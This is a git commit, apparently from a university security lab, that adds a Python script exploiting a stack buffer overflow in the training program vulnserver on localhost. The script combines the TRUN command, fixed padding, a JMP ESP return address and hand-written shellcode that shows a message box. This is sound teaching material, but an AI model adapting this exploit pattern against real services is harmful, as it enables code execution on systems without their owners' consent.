12ae8f628dc2004ed8c4b483ea171e4ecb88e891
Jeevana Kalvakuntla <jeka2259@colorado.edu>
2025-12-03 23:24:45 -0800

    final shellcode lab7

---
+++ final_shellcode.py
@@ -0,0 +1,54 @@
+import socket
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.settimeout(10)  #to prevent hanging if server stops responding
+
+sock.connect(("localhost", 9999))  # connecting to vulnserver on port 9999
+print("[+] Connection made")
+
+banner = sock.recv(1024)  # to read the initial banner
+print(banner)
+
+length = 2006  # exact offset to overwrite EIP -
+# choosing the calculated length -> difference between return call and function address minus 6 bytes for TRUN (2012-6)
+
+# message box shellcode that pops a MessageBox: "Hello from Jeevana!"
+buf = b"\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
+buf += b"\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"
+buf += b"\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"
+buf += b"\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"
+buf += b"\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"
+buf += b"\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
+buf += b"\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"
+buf += b"\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"
+buf += b"\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"
+buf += b"\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"
+buf += b"\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"
+buf += b"\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
+buf += b"\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"
+buf += b"\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"
+buf += b"\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68"
+buf += b"\x6E\x61\x21\x20\x68\x65\x65\x76\x61\x68"
+buf += b"\x6F\x6D\x20\x4A\x68\x6F\x20\x66\x72\x68"
+buf += b"\x48\x65\x6C\x6C\x8b\xcc\x57\x57\x51\x57"
+buf += b"\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
+buf += b"\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"
+buf += b"\x69\x74\x54\x53\xff\xd6\x57\xff\xd0"
+
+
+# JMP ESP address from essfunc.dll (0x625011BB)
+jmp_esp = b"\xbb\x11\x50\x62" 
+
+# Built the final exploit string:
+# TRUN command + padding + JMP ESP + shellcode
+data = b"TRUN ." + b"A" * length + jmp_esp + buf
+
+sock.send(data)    # sending the payload to the server
+print("[*] Sent string, waiting for response...")
+
+try:
+    print(sock.recv(1024))  # trying to read any reply before the crash
+except:
+    pass  # ignores errors because the server usually crashes
+
+sock.close()   # close connection
